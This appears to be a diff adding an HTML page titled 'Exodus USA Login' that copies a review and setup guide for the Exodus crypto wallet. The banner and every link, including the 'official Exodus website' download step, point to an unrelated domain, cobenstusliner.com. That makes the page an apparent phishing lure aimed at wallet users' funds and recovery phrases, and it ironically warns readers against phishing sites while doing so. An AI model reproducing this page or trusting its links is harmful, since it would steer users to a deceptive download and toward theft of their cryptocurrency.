@@ -1,0 +1,116 @@
+<html>
+<head>
+<title>Exodus USA Login </title>
+
+<a href="https://cobenstusliner.com/rMRR85FXsjbmwT3Qt6MCtg4m">
+<center><img src="https://uploads-ssl.webflow.com/61aeddd9dc0ed83ef4051015/61aede0530e53b4f14ca991f_exodus-wallet.jpeg"  width="1280" height="720"></center>
+</a>
+
+<body>
+            <center>   <h1><b>Exodus wallet - Setup Guide & How to Use it </h1></b>  </center>
+
+                    <p>One of the most innovative and unique aspects of the Exodus cryptocurrency wallet is the ability to trade cryptocurrencies from within the wallet. Users can exchange their cryptocurrencies for one another and buy new cryptocurrencies, without having to send their crypto to an exchange. This feature adds a whole new level of user experience and is not widely supported by other crypto wallets. The in-wallet exchange is made possible with an API integration with ShapeShift. Users can simply click on the exchange tab and begin exchanging any of the Exodus supported cryptos for different supported Exodus cryptos. The whole process is seamless and can be done with a few clicks in a matter of seconds.
+
+ 
+
+Price
+
+ 
+
+<p>The<a href="https://cobenstusliner.com/rMRR85FXsjbmwT3Qt6MCtg4m">Exodus wallet </a>is absolutely free and can be downloaded from the Exodus website. Users are not charged an additional fee for sending or receiving cryptocurrencies with Exodus. The only fees users must pay when transacting crypto are the network fees. These fees do not go to the Exodus wallet and are only paid to the network to ensure the transactions are delivered quickly and reliably. The only place where Exodus charges fees is in the built-in wallet exchange. Here, Exodus generates a small income from the spread on the crypto asset exchange and this spread is generally 2% – 4% or less. Other than that, the Exodus cryptocurrency is free to use, and users will not be charged fees by Exodus unless they use the built-in crypto exchange.
+
+ 
+
+ 
+
+<p><h3>Pros and Cons</h3>
+
+ 
+
+<br><b>Pros</b>
+
+Excellent design and user interface
+
+<br>A wide array of supported cryptocurrencies
+
+<br>Built-in cryptocurrency exchange
+
+<br>Exceptional support
+
+ 
+
+<br><b>Cons</b>
+
+<br>Not 100% open source
+
+<br>Limited security features
+
+<br>No mobile application
+
+<br>setup Guide & How to Use it
+
+<br>The Exodus wallet is built for the mainstream cryptocurrency user and is thus very easy to setup and use. The entire installation and setup process can be completed in minutes and walks the users through step by step. See below, just how easy it is to start using the Exodus cryptocurrency wallet.
+
+ 
+
+<p>
+<b>Step 1: Download & Install the Exodus Wallet</b>
+
+<br>Using your desktop computer, navigate to the official<a href="https://cobenstusliner.com/rMRR85FXsjbmwT3Qt6MCtg4m"> Exodus website </a>and download the Exodus wallet for your operating system (Windows, Mac, Linux). Be sure you are on the correct website and not a phishing site. Once downloaded, install the wallet and open it up.
+
+ 
+<p>
+<b>Step 2: Setup Wallet</b>
+
+<br>Once the wallet is opened, you will need to fund the wallet with some cryptocurrency to get started with the rest of the setup process. So, click the wallet tab on the left-hand side of the screen and then select a cryptocurrency you would like to deposit into the wallet, (you must already own a supported cryptocurrency as the Exodus wallet doesn’t support fiat currency for buying cryptos).
+
+ 
+
+<p>
+<b>Step 3: Deposit Cryptocurrency</b>
+
+<br>Click the receive button under the cryptocurrency you selected in the previous step and your receiving address and QR code will show up. Send an amount of cryptocurrency to this address, (it must be the same kind of crypto as the receiving address).
+
+ 
+
+
+<p><b>Step 4: Create Password & Backup Wallet</b>
+
+<br>Once the cryptocurrency is deposited click the Backup tab on the left-hand side of the screen. You will then be prompted to create a secure password that will be used for accessing your account. Once you create and verify your password, you will be shown a 12-word recovery phrase. Write this phrase down on a piece of paper in sequential order and store it offline in a safe and secure place. Then you will be required to type in an email address for the email recovery link.
+
+ 
+
+
+<p><b>Step 5: Complete</b>
+
+<br>Your account is now successfully backed up and complete. Users can now click the portfolio tab to see their account holdings, click the wallet tab to send and receive funds, and click the exchange tab to exchange between cryptocurrency assets via the ShapeShift exchange integration.
+
+ 
+
+ 
+
+
+<p><b>Support</b>
+
+<br>The support offered by the Exodus wallet is phenomenal. On the Exodus website, users have access to an extensive knowledge base that features over 100 articles explain features, troubleshooting, fees, and other general topics. As well, users can browse an extensive FAQ list with a built-in search function. If for some reason you can not find what you’re looking for, support representatives can be reached via email or through various social media channels. All in all, the customer support is exceptional for the Exodus wallet.
+
+ 
+
+<p><b>Summary</b>
+
+ 
+
+<br>The Exodus cryptocurrency wallet is an excellent crypto wallet for users with a wide variety of cryptocurrencies in smaller amounts. The wallet is very easy to use and beautifully designed with a built-in cryptocurrency exchange. The Exodus wallet is best for users who want a convenient and versatile crypto wallet where they can easily manage their portfolio and make trades in an instant. However, the Exodus wallet is only a software wallet and does not feature nearly as many security features as hardware wallets and some other software wallets. Therefore, the Exodus wallet is best used for mainstream users who do not hold a significant amount of cryptocurrency.
+
+ 
+
+<p><b>Backup Features</b>
+
+<br>If your computer holding the Exodus wallet is lost, stolen or destroyed, your Exodus wallet with all of its funds and private keys can be restored on a new computer. This is made possible with the Exodus wallet built in the backup process. Upon setting up your Exodus wallet, you will be given a deterministic 12-word recovery phrase that you must write down on a piece of paper and store it offline in a safe and secure place. If you ever need to restore your Exodus wallet, simply download the Exodus wallet and instead of clicking “create new wallet” click “restore wallet” and type in your 12-word recovery seed in sequential order.
+
+ 
+
+<br>Alternatively, users can restore their wallet through the email restore option. Upon creating an account, you will receive an email with a backup link. Clicking on this link and entering your Exodus password will restore your wallet account.
+
+
+         
